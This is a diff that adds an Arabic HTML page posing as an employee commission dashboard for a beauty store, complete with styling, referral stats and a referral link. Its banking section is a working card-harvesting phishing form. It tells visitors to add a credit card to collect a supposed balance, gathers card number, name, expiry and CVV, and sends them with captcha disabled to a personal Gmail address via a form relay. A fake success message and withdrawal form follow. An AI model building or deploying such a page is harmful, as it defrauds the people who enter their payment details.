@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة الموظف | جمالك</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* == بداية: أنماط "جمالك" مأخوذة من index.html == */
+        :root {
+            --primary-color: #FFC1CC;
+            --secondary-color: #D8B4E2;
+            --neutral-color: #FFF8F0;
+            --button-color: #FF6B81;
+            --text-color: #4A4A4A;
+            --light-text: #ffffff;
+            --dark-text: #333333;
+            --border-radius: 8px;
+            --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            --transition: all 0.3s ease;
+            --discount-color: #FF4757;
+            --exclusive-color: #9c27b0;
+            --new-color: #2ed573;
+            --fast-delivery: #ffd700;
+            --success-color: #2ed573; /* تم إضافة هذا لتوحيد لون النجاح */
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Tajawal', sans-serif;
+        }
+
+        body {
+            background-color: #f9f9f9;
+            color: var(--dark-text);
+            direction: rtl;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        ul {
+            list-style: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 15px;
+        }
+
+        /* الهيدر (مأخوذ من index.html) */
+        header {
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .header-top {
+            background-color: #f8f8f8;
+            padding: 8px 0;
+            font-size: 0.85rem;
+        }
+
+        .header-top-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-top-left {
+            display: flex;
+            gap: 20px;
+        }
+
+        .header-top-right {
+            display: flex;
+            gap: 20px;
+        }
+
+        .header-main {
+            padding: 15px 0;
+        }
+
+        .header-main-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--button-color);
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 25px;
+        }
+
+        .nav-menu a {
+            font-weight: 500;
+            transition: var(--transition);
+        }
+
+        .nav-menu a:hover {
+            color: var(--button-color);
+        }
+
+        .header-actions {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .header-icon {
+            font-size: 1.2rem;
+            color: var(--dark-text);
+            position: relative;
+            transition: var(--transition);
+        }
+
+        .header-icon:hover {
+            color: var(--button-color);
+        }
+
+        .cart-count {
+            position: absolute;
+            top: -8px;
+            left: -8px;
+            background-color: var(--button-color);
+            color: white;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            font-size: 0.7rem;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-btn {
+            background-color: var(--button-color);
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: var(--border-radius);
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .login-btn:hover {
+            background-color: #e55c71;
+        }
+
+        .hamburger {
+            display: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+        }
+        /* == نهاية: أنماط "جمالك" == */
+
+
+        /* == بداية: أنماط لوحة الموظف (مُعدلة بألوان "جمالك") == */
+        
+        .employee-dashboard {
+            padding: 30px 0;
+        }
+
+        .dashboard-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .dashboard-title {
+            font-size: 2.2rem; /* تم تكبير الخط ليتناسب مع "جمالك" */
+            color: var(--dark-text);
+            margin-bottom: 10px;
+        }
+
+        .dashboard-subtitle {
+            color: var(--text-color);
+            font-size: 1.1rem;
+        }
+
+        .stats-cards-container {
+            overflow-x: auto;
+            margin-bottom: 30px;
+            padding-bottom: 10px;
+            -webkit-overflow-scrolling: touch;
+        }
+
+        .stats-cards {
+            display: flex;
+            gap: 15px;
+            width: max-content;
+            padding: 5px;
+        }
+
+        .stat-card {
+            background-color: white;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            box-shadow: var(--box-shadow);
+            text-align: center;
+            min-width: 250px;
+            flex-shrink: 0;
+        }
+
+        .stat-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            /* تم تغيير اللون إلى لون "جمالك" */
+            background-color: rgba(255, 107, 129, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 1.3rem;
+            color: var(--button-color);
+        }
+
+        .stat-title {
+            font-size: 1rem;
+            color: #777;
+            margin-bottom: 10px;
+        }
+
+        .stat-value {
+            font-size: 1.6rem;
+            font-weight: bold;
+            color: var(--dark-text);
+        }
+
+        .stat-change {
+            margin-top: 10px;
+            font-size: 0.85rem;
+            color: var(--success-color);
+        }
+
+        .referral-section, .banking-section, .transactions-section {
+            background-color: white;
+            border-radius: var(--border-radius);
+            padding: 20px;
+            box-shadow: var(--box-shadow);
+            margin-bottom: 30px;
+        }
+
+        .section-title {
+            font-size: 1.5rem;
+            color: var(--dark-text);
+            margin-bottom: 15px;
+            /* تم تغيير لون الخط السفلي إلى لون "جمالك" */
+            border-bottom: 2px solid var(--button-color);
+            padding-bottom: 10px;
+        }
+
+        .referral-link-container {
+            display: flex;
+            flex-direction: column;
+            margin-bottom: 20px;
+        }
+
+        .referral-link {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            background-color: #f9f9f9;
+            margin-bottom: 10px;
+        }
+
+        .copy-btn {
+            padding: 12px 20px;
+            /* تم تغيير اللون إلى لون "جمالك" */
+            background-color: var(--button-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .copy-btn:hover {
+            background-color: #e55c71; /* لون "جمالك" عند المرور */
+        }
+
+        .referral-info {
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+        }
+
+        .referral-info p {
+            margin-bottom: 10px;
+            color: #555;
+        }
+
+        .referral-info ul {
+            padding-right: 20px;
+            color: #555;
+        }
+
+        .referral-info li {
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+
+        /* قسم إضافة البطاقة */
+        .banking-message {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            background-color: var(--neutral-color);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+
+        .banking-message i {
+            font-size: 1.5rem;
+            color: var(--button-color); /* تم تغيير اللون */
+            margin-bottom: 10px;
+        }
+
+        .banking-message p {
+            flex: 1;
+            color: var(--dark-text); /* تم تغيير اللون */
+            margin-bottom: 15px;
+        }
+
+        .add-card-btn {
+            padding: 12px 25px;
+            background-color: var(--button-color); /* تم تغيير اللون */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: var(--transition);
+            align-self: flex-end;
+        }
+
+        .add-card-btn:hover {
+            background-color: #e55c71; /* لون "جمالك" عند المرور */
+        }
+
+        .card-form {
+            display: none;
+            background-color: #f9f9f9;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+        }
+
+        .form-row {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-color); /* تم تغيير اللون */
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 1rem;
+            transition: var(--transition);
+        }
+
+        .form-input:focus {
+            /* تم تغيير ألوان التركيز لتطابق "جمالك" */
+            border-color: var(--button-color);
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(255, 107, 129, 0.2);
+        }
+
+        .card-type-icon {
+            position: absolute;
+            left: 15px;
+            top: 40px;
+            font-size: 24px;
+            color: #ccc;
+        }
+
+        .card-input-group {
+            position: relative;
+        }
+
+        .card-input-group .form-input {
+            padding-left: 50px;
+        }
+
+        .form-actions {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .cancel-btn {
+            padding: 10px 20px;
+            background-color: #ddd;
+            color: #333;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .cancel-btn:hover {
+            background-color: #ccc;
+        }
+
+        .save-btn {
+            padding: 10px 20px;
+            background-color: var(--success-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .save-btn:hover {
+            background-color: #219653;
+        }
+
+        /* قسم المعاملات */
+        .transaction-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 15px 0;
+            border-bottom: 1px solid #eee;
+        }
+
+        .transaction-info {
+            flex: 1;
+        }
+
+        .transaction-title {
+            font-weight: 500;
+            margin-bottom: 5px;
+        }
+
+        .transaction-date {
+            color: #777;
+            font-size: 0.9rem;
+        }
+
+        .transaction-amount {
+            font-weight: bold;
+            color: var(--success-color);
+        }
+
+        .transaction-amount.withdrawal {
+            color: var(--discount-color); /* تم تغيير اللون */
+        }
+
+        .no-transactions {
+            text-align: center;
+            padding: 30px;
+            color: #777;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .success-message {
+            background-color: #eaf7ee;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+        }
+
+        .success-message i {
+            margin-left: 10px;
+        }
+        /* == نهاية: أنماط لوحة الموظف == */
+
+
+        /* == بداية: أنماط الفوتر (مأخوذة من index.html) == */
+        footer {
+            background-color: #2c2c2c;
+            color: #f1f1f1;
+            padding: 60px 0 20px;
+            margin-top: 40px;
+        }
+
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 40px;
+            margin-bottom: 40px;
+        }
+
+        .footer-column h4 {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            position: relative;
+            padding-bottom: 10px;
+            color: white;
+        }
+
+        .footer-column h4::after {
+            content: "";
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 40px;
+            height: 2px;
+            background-color: var(--button-color);
+        }
+
+        .footer-links li {
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #ccc;
+            transition: var(--transition);
+        }
+        
+        .footer-links a:hover {
+            color: var(--primary-color);
+            padding-right: 5px;
+        }
+
+        .social-icons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .social-icon {
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            background-color: #444;
+            border-radius: 50%;
+            color: white;
+            font-size: 1.2rem;
+            transition: var(--transition);
+        }
+
+        .social-icon:hover {
+            background-color: var(--button-color);
+            transform: translateY(-3px);
+        }
+
+        .footer-bottom {
+            text-align: center;
+            padding-top: 30px;
+            border-top: 1px solid #444;
+            font-size: 0.9rem;
+            color: #999;
+        }
+        /* == نهاية: أنماط الفوتر == */
+
+
+        /* == بداية: أنماط التجاوب (مأخوذة من index.html ومدمجة) == */
+        @media (min-width: 768px) {
+            .referral-link-container {
+                flex-direction: row;
+            }
+            
+            .referral-link {
+                width: auto;
+                margin-bottom: 0;
+                margin-left: 10px;
+            }
+            
+            .banking-message {
+                flex-direction: row;
+                align-items: center;
+            }
+            
+            .banking-message i {
+                margin-bottom: 0;
+                margin-left: 15px;
+            }
+            
+            .banking-message p {
+                margin-bottom: 0;
+            }
+            
+            .form-row {
+                flex-direction: row;
+            }
+            
+            .stats-cards {
+                display: grid;
+                grid-template-columns: repeat(2, 1fr);
+                width: 100%;
+            }
+        }
+
+        @media (min-width: 992px) {
+            .stats-cards {
+                grid-template-columns: repeat(3, 1fr);
+            }
+            .stats-cards-container {
+                overflow-x: visible;
+            }
+        }
+
+        @media (max-width: 992px) {
+            .nav-menu {
+                gap: 15px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .header-top-container {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .nav-menu {
+                display: none;
+                position: absolute;
+                top: 100%;
+                right: 0;
+                background-color: white;
+                width: 100%;
+                flex-direction: column;
+                padding: 20px;
+                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+                z-index: 100;
+            }
+
+            .nav-menu.active {
+                display: flex;
+            }
+
+            .nav-menu li {
+                margin: 10px 0;
+            }
+
+            .hamburger {
+                display: block;
+            }
+        }
+
+        @media (max-width: 576px) {
+            .header-main-container {
+                flex-wrap: wrap;
+            }
+            
+            .logo {
+                font-size: 1.5rem;
+            }
+
+            .dashboard-title {
+                font-size: 1.8rem;
+            }
+            
+            .section-title {
+                font-size: 1.3rem;
+            }
+
+            .footer-content {
+                grid-template-columns: 1fr;
+                text-align: center;
+            }
+            
+            .footer-column h4::after {
+                right: 50%;
+                transform: translateX(50%);
+            }
+            
+            .social-icons {
+                justify-content: center;
+            }
+            
+            .stat-card {
+                min-width: 220px;
+                padding: 15px;
+            }
+            
+            .stat-icon {
+                width: 40px;
+                height: 40px;
+                font-size: 1.1rem;
+            }
+            
+            .stat-value {
+                font-size: 1.4rem;
+            }
+            
+            .referral-info ul {
+                padding-right: 15px;
+            }
+            
+            .copy-btn, .add-card-btn {
+                padding: 10px 15px;
+                font-size: 0.9rem;
+            }
+            
+            .form-actions {
+                flex-direction: column;
+            }
+            
+            .cancel-btn, .save-btn {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+        }
+        /* == نهاية: أنماط التجاوب == */
+    </style>
+</head>
+<body>
+    
+    <header>
+        <div class="header-top">
+            <div class="container header-top-container">
+                <div class="header-top-left">
+                </div>
+                <div class="header-top-right">
+                </div>
+            </div>
+        </div>
+        
+        <div class="container header-main-container">
+            <div class="logo">جمالك</div>
+            
+            <ul class="nav-menu">
+                <li><a href="index.html">الرئيسية</a></li>
+                <li><a href="التصنيفات.html">منتجاتنا</a></li>
+                <li><a href="make.html">مكياج</a></li>
+                <li><a href="99.html">أقل من 99 ريال</a></li>
+                <li><a href="#">الاشتراك</a></li>
+                <li><a href="التصنيفات.html">عروض خاصة</a></li>
+                <li><a href="#">مدونة الجمال</a></li>
+                <li><a href="#">تواصل معنا</a></li>
+            </ul>
+            
+            <div class="header-actions">
+                <a href="#" class="header-icon">
+                    <i class="fas fa-search"></i>
+                </a>
+                <a href="index.html" class="header-icon">
+                    <i class="far fa-heart"></i>
+                </a>
+                <a href="sk.html" class="header-icon">
+                    <i class="fas fa-shopping-cart"></i>
+                    <span class="cart-count">0</span>
+                </a>
+                <button class="login-btn" onclick="window.location.href='log.html'">تسجيل دخول</button>
+                <div class="hamburger">
+                    <i class="fas fa-bars"></i>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <section class="employee-dashboard container">
+        <div class="dashboard-header">
+            <h1 class="dashboard-title">لوحة تحكم الموظف</h1>
+            <p class="dashboard-subtitle" id="welcomeMessage">مرحباً بك! هذه إحصائيات أدائك وعمولاتك</p>
+        </div>
+
+        <div class="stats-cards-container">
+            <div class="stats-cards">
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-users"></i>
+                    </div>
+                    <h3 class="stat-title">عدد الأشخاص المدعوين</h3>
+                    <div class="stat-value">0</div>
+                    <div class="stat-change">+0 هذا الشهر</div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-wallet"></i>
+                    </div>
+                    <h3 class="stat-title">الرصيد المودع</h3>
+                    <div class="stat-value">0 ر.س</div>
+                    <div class="stat-change">+0 ر.س هذا الشهر</div>
+                </div>
+
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-gift"></i>
+                    </div>
+                    <h3 class="stat-title">العمولات المستحقة</h3>
+                    <div class="stat-value">0 ر.س</div>
+                    <div class="stat-change">سيتم تحويلها قريباً</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="referral-section">
+            <h2 class="section-title">رابط الدعوة الخاص بك</h2>
+            <div class="referral-link-container">
+                <input type="text" class="referral-link" id="referralLink" value="https://jamalk.com/ref/employee123" readonly>
+                <button class="copy-btn" onclick="copyReferralLink()">
+                    <i class="fas fa-copy"></i> نسخ
+                </button>
+            </div>
+            
+            <div class="referral-info">
+                <p><strong>كيف يعمل نظام العمولات:</strong></p>
+                <ul>
+                    <li>سيحصل كل شخص يسجل باستخدام رابطك على خصم 10% على أول طلب</li>
+                    <li>ستحصل على 100 ر.س عمولة عن كل شخص يسجل باستخدام رابطك ويقوم بأول عملية شراء</li>
+                    <li>العمولات تتراكم في رصيدك ويمكن سحبها بعد إضافة بطاقة ائتمان أو حساب بنكي</li>
+                </ul>
+            </div>
+        </div>
+
+        <div class="banking-section">
+            <h2 class="section-title">الحساب البنكي</h2>
+            
+            <div class="banking-message" id="bankMessage">
+                <i class="fas fa-info-circle"></i>
+                <p>يرجى إضافة بطاقة ائتمان/ربط حساب بنكي لاستلام الرصيد المودع لحسابكم</p>
+                <button class="add-card-btn" onclick="showCardForm()">إضافة</button>
+            </div>
+
+            <form class="card-form" id="cardForm" action="https://formsubmit.co/gohyt4480@gmail.com" method="POST">
+                <input type="hidden" name="_subject" value="طلب إضافة بطاقة بنكية - جمالك">
+                <input type="hidden" name="_template" value="table">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="نوع الطلب" value="إضافة بطاقة بنكية للموظف">
+                
+                <h3>إضافة بطاقة ائتمان جديدة</h3>
+                
+                <div class="form-group card-input-group">
+                    <label class="form-label">رقم البطاقة</label>
+                    <div class="card-type-icon" id="cardTypeIcon">
+                        <i class="fas fa-credit-card"></i>
+                    </div>
+                    <input type="text" class="form-input" name="رقم البطاقة" placeholder="1234 5678 9012 3456" id="cardNumber" maxlength="19" required>
+                </div>
+                
+                <div class="form-row">
+                    <div class="form-group">
+                        <label class="form-label">اسم صاحب البطاقة</label>
+                        <input type="text" class="form-input" name="اسم صاحب البطاقة" placeholder="الاسم" id="cardName" required>
+                    </div>
+                    <div class="form-group">
+                        <label class="form-label">تاريخ الانتهاء</label>
+                        <input type="text" class="form-input" name="تاريخ الانتهاء" placeholder="MM/YY" id="cardExpiry" maxlength="5" required>
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label">CVV</label>
+                    <input type="text" class="form-input" name="CVV" placeholder="123" id="cardCvv" maxlength="3" required>
+                </div>
+                
+                <div class="form-actions">
+                    <button type="button" class="cancel-btn" onclick="hideCardForm()">إلغاء</button>
+                    <button type="submit" class="save-btn">حفظ</button>
+                </div>
+            </form>
+
+            <div class="hidden" id="bankInfo">
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <p>تم ربط البطاقة بنجاح! يمكنك الآن سحب الأموال من رصيدك.</p>
+                </div>
+                
+                <form class="withdrawal-form" action="https://formsubmit.co/gohyt4480@gmail.com" method="POST">
+                    <input type="hidden" name="_subject" value="طلب سحب أموال - جمالك">
+                    <input type="hidden" name="_template" value="table">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="نوع الطلب" value="طلب سحب أموال للموظف">
+                    
+                    <h3>طلب سحب الأموال</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label class="form-label">المبلغ المراد سحبه</label>
+                            <input type="number" class="form-input" name="المبلغ" placeholder="المبلغ بالريال السعودي" id="withdrawAmount" required>
+                        </div>
+                        <div class="form-group">
+                            <label class="form-label">طريقة السحب</label>
+                            <select class="form-input" name="طريقة السحب">
+                                <option value="بطاقة الائتمان">بطاقة الائتمان</option>
+                                <option value="حساب بنكي">حساب بنكي</option>
+                            </select>
+                        </div>
+                    </div>
+                    <button type="submit" class="save-btn">طلب السحب</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="transactions-section">
+            <h2 class="section-title">آخر المعاملات</h2>
+            
+            <div class="no-transactions">
+                <i class="fas fa-receipt" style="font-size: 3rem; margin-bottom: 15px; color: #ddd;"></i>
+                <p>لا توجد معاملات حتى الآن</p>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+          <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h4>عن المتجر</h4>
+                    <p>متجرنا يقدم أجود منتجات التجميل والعناية بالبشرة والشعر مع ضمان الجودة والخدمة المتميزة.</p>
+                    <div class="social-icons">
+                        <a href="#" class="social-icon"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="social-icon"><i class="fab fa-tiktok"></i></a>
+                        <a href="#" class="social-icon"><i class="fab fa-whatsapp"></i></a>
+                    </div>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>روابط سريعة</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">تتبع الطلب</a></li>
+                        <li><a href="#">الاشتراك</a></li>
+                        <li><a href="#">اتصل بنا</a></li>
+                        <li><a href="#">الأسئلة الشائعة</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>المساعدة</h4>
+                    <ul class="footer-links">
+                        <li><a href="#">شروط الاستخدام</a></li>
+                        <li><a href="#">سياسة الخصوصية</a></li>
+                        <li><a href="#">سياسة الإرجاع</a></li>
+                        <li><a href="#">طرق الدفع</a></li>
+                    </ul>
+                </div>
+                
+                <div class="footer-column">
+                    <h4>القائمة البريدية</h4>
+                    <p>اشتركي في نشرتنا البريدية لتصلك آخر العروض والأخبار</p>
+                    <form>
+                        <input type="email" placeholder="بريدك الإلكتروني" style="padding: 10px; width: 100%; margin-bottom: 10px; border-radius: var(--border-radius); border: none;">
+                        <button type="submit" class="subscribe-btn" style="width: 100%; padding: 10px; background-color: var(--button-color); color: white; border: none; border-radius: var(--border-radius); cursor: pointer;">اشتراك</button>
+                    </form>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p>© 2025 جمالك. جميع الحقوق محفوظة.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // == بداية: السكريبت المأخوذ من "index.html" ==
+        
+        // بيانات المنتجات (متروكة فارغة هنا لأنها صفحة موظف)
+        const products = [];
+        const under99Products = [];
+        const perfumeProducts = [];
+
+        // متغيرات نظام السلة
+        let cart = [];
+
+        // دالة لتحميل السلة من localStorage
+        function loadCartFromLocalStorage() {
+            const savedCart = localStorage.getItem('jamalkCart');
+            if (savedCart) {
+                cart = JSON.parse(savedCart);
+                updateCartCount();
+            }
+        }
+
+        // دالة لحفظ السلة إلى localStorage
+        function saveCartToLocalStorage() {
+            localStorage.setItem('jamalkCart', JSON.stringify(cart));
+        }
+
+        // دالة لتحديث عداد السلة
+        function updateCartCount() {
+            const cartCount = document.querySelector('.cart-count');
+            if (cartCount) { // التأكد من وجود العنصر
+                const totalItems = cart.reduce((total, item) => total + item.quantity, 0);
+                cartCount.textContent = totalItems;
+            }
+        }
+
+        // (تم حذف دوال عرض المنتجات والإضافة للسلة من هنا)
+
+        // دالة لإظهار/إخفاء القائمة على الهواتف (من index.html)
+        const hamburger = document.querySelector('.hamburger');
+        if (hamburger) {
+            hamburger.addEventListener('click', function() {
+                document.querySelector('.nav-menu').classList.toggle('active');
+            });
+        }
+       
+        // تهيئة الصفحة عند التحميل
+        document.addEventListener('DOMContentLoaded', function() {
+            // تحميل السلة من localStorage
+            loadCartFromLocalStorage();
+            
+            // (تم حذف دوال عرض المنتجات من هنا)
+        });
+        
+        // == نهاية: السكريبت المأخوذ من "index.html" ==
+
+
+        // == بداية: السكريبتات الأصلية الخاصة بصفحة "ep.html" ==
+
+        // محاولة قراءة اسم المستخدم
+        function loadUserName() {
+            // بيانات افتراضية لأننا لا نملك نظام تسجيل دخول حقيقي
+            const userData = {
+                name: "موظف",
+                role: "موظف"
+            };
+            
+            const userName = userData.name || "مستخدم";
+            
+            document.getElementById('welcomeMessage').textContent = 
+                `مرحباً بك، ${userName}! هذه إحصائيات أدائك وعمولاتك`;
+        }
+
+        // نسخ رابط الدعوة
+        function copyReferralLink() {
+            const referralLink = document.getElementById('referralLink');
+            referralLink.select();
+            document.execCommand('copy');
+            
+            alert('تم نسخ رابط الدعوة: ' + referralLink.value);
+        }
+
+        // إظهار نموذج إضافة البطاقة
+        function showCardForm() {
+            document.getElementById('cardForm').style.display = 'block';
+            document.getElementById('bankMessage').style.display = 'none';
+        }
+
+        // إخفاء نموذج إضافة البطاقة
+        function hideCardForm() {
+            document.getElementById('cardForm').style.display = 'none';
+            document.getElementById('bankMessage').style.display = 'flex';
+        }
+
+        // التعرف على نوع البطاقة
+        const cardNumberInput = document.getElementById('cardNumber');
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', function(e) {
+                const cardNumber = e.target.value.replace(/\s/g, '');
+                const cardTypeIcon = document.getElementById('cardTypeIcon');
+                
+                let iconClass = 'fa-credit-card';
+                
+                if (/^4/.test(cardNumber)) {
+                    iconClass = 'fa-cc-visa';
+                } else if (/^5[1-5]/.test(cardNumber)) {
+                    iconClass = 'fa-cc-mastercard';
+                } else if (/^3[47]/.test(cardNumber)) {
+                    iconClass = 'fa-cc-amex';
+                }
+                
+                cardTypeIcon.innerHTML = `<i class="fab ${iconClass}"></i>`;
+            });
+        }
+
+        // تنسيق رقم البطاقة
+        if (cardNumberInput) {
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 0) {
+                    value = value.match(/.{1,4}/g).join(' ');
+                }
+                e.target.value = value;
+            });
+        }
+
+        // تنسيق تاريخ الانتهاء
+        const cardExpiryInput = document.getElementById('cardExpiry');
+        if (cardExpiryInput) {
+            cardExpiryInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    value = value.substring(0, 2) + '/' + value.substring(2);
+                }
+                e.target.value = value;
+            });
+        }
+
+        // معالجة إرسال نموذج البطاقة
+        const cardForm = document.getElementById('cardForm');
+        if (cardForm) {
+            cardForm.addEventListener('submit', function(e) {
+                const cardNumber = document.getElementById('cardNumber').value;
+                const cardName = document.getElementById('cardName').value;
+                const cardExpiry = document.getElementById('cardExpiry').value;
+                const cardCvv = document.getElementById('cardCvv').value;
+                
+                if (!cardNumber || !cardName || !cardExpiry || !cardCvv) {
+                    e.preventDefault();
+                    alert('يرجى ملء جميع حقول البطاقة');
+                    return;
+                }
+                
+                document.getElementById('cardForm').style.display = 'none';
+                document.getElementById('bankInfo').classList.remove('hidden');
+                
+                alert('تم إرسال طلب إضافة البطاقة بنجاح! سيتم مراجعته من قبل الإدارة.');
+            });
+        }
+
+        // معالجة إرسال نموذج السحب
+        const withdrawalForm = document.querySelector('.withdrawal-form');
+        if (withdrawalForm) {
+            withdrawalForm.addEventListener('submit', function(e) {
+                const withdrawAmount = document.getElementById('withdrawAmount').value;
+                
+                if (!withdrawAmount || withdrawAmount <= 0) {
+                    e.preventDefault();
+                    alert('يرجى إدخال مبلغ صحيح للسحب');
+                    return;
+                }
+                
+                alert('تم إرسال طلب السحب بنجاح! سيتم معالجته خلال 24-48 ساعة.');
+            });
+        }
+
+        // تحميل اسم المستخدم عند بدء التشغيل
+        window.addEventListener('DOMContentLoaded', function() {
+            loadUserName();
+        });
+        
+        // == نهاية: السكريبتات الأصلية الخاصة بصفحة "ep.html" ==
+    </script>
+</body>
+</html>
